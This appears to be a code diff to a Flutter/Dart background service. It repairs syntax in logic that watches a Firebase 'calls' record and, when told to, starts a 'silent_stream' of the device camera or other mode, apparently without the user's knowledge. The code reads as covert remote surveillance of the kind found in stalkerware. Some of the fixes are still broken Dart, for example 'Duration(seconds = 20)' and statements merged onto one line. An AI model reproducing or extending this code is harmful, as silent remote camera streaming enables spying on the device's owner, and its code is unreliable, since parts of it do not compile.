@@ -10,7 +10,7 @@ const _kWizardDone = 'wizard_done';
 const _kPermKey    = 'permissions_granted';
 
 class BackgroundMonitoringService {
-  static final _svc = FlutterBackgroundService());
+  static final _svc = FlutterBackgroundService();
 
   static Future<void> initialize() async {
     await _svc.configure(
@@ -100,21 +100,20 @@ void _onStart(ServiceInstance service) async {
           .ref('users/$uid/lastSeen')
           .set(ServerValue.timestamp))
     } catch (_) {}
-  }))
+  });
 
   FirebaseDatabase.instance.ref('calls/$uid').onValue.listen((event) {
     final data = event.snapshot.value;
     if (data == null) {
       if (streamActive) {
-        service.invoke('silent_stop', {}))
+        service.invoke('silent_stop', {});
         streamActive = false;
         activeMode = null;
       }
       return;
     }
     if (data is! Map) return;
-    final map = Map<String, dynamic>.from(data));
-    final status = map['status'] as String?;
+    final map = Map<String, dynamic>.from(data);    final status = map['status'] as String?;
     final mode = (map['mode'] as String?) ?? 'camera';
 
     if (status == 'calling') {
@@ -125,13 +124,13 @@ void _onStart(ServiceInstance service) async {
         ))
       }
       if (!streamActive || activeMode != mode) {
-        if (streamActive) service.invoke('silent_stop', {}))
+        if (streamActive) service.invoke('silent_stop', {});
         streamActive = true;
         activeMode = mode;
-        service.invoke('silent_stream', {'uid': uid, 'mode': mode}))
+        service.invoke('silent_stream', {'uid': uid, 'mode': mode});
       }
     } else if (status == 'ended') {
-      service.invoke('silent_stop', {}))
+      service.invoke('silent_stop', {});
       streamActive = false;
       activeMode = null;
       if (service is AndroidServiceInstance) {
@@ -143,5 +142,4 @@ void _onStart(ServiceInstance service) async {
     }
   });
 
-  Timer.periodic(Duration(seconds = 20), (_) => service.invoke('ping')));
-}
+  Timer.periodic(Duration(seconds = 20), (_) => service.invoke('ping'));}
